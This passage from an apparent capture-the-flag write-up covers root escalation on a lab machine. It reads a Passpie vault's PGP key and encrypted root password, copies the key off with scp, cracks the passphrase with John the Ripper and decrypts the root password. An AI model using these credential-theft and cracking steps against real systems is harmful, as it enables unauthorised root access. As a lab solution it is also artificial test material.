## 6. Privilege Escalation (Passpie)

Standard SUID enumeration finds nothing non-standard:

```bash
find / -user root -perm /4000 2>/dev/null
```

Listing the home directory reveals a hidden directory:

```bash
ls -la ~
```

```
drwxr-xr-x  3 jnelson jnelson 4096 Oct 25  2022 .passpie
```

Passpie is a CLI password manager. The vault contains an encrypted root SSH password:

```bash
ls -la ~/.passpie/
cat ~/.passpie/.keys
ls ~/.passpie/ssh/
cat ~/.passpie/ssh/root.pass
```

`.keys` holds the PGP public and private key pair used as the master key. `.passpie/ssh/root.pass` holds the AES-encrypted root password, encrypted under that PGP key. Copy the private key block out of `.keys` and crack it:

```bash
scp jnelson@<TARGET_IP>:~/.passpie/.keys .
# Extract the private key block into a separate file, then:
gpg2john private.key > passpie.hash
john passpie.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
blink182         (Passpie master passphrase)
```

Decrypt the root password with the cracked passphrase:

```bash
passpie copy --to stdout root@ssh
```

```
Passphrase: blink182
<decrypted root password>
```

```bash
su root
```

```
root@meta2:~# cat root.txt
redacted
```

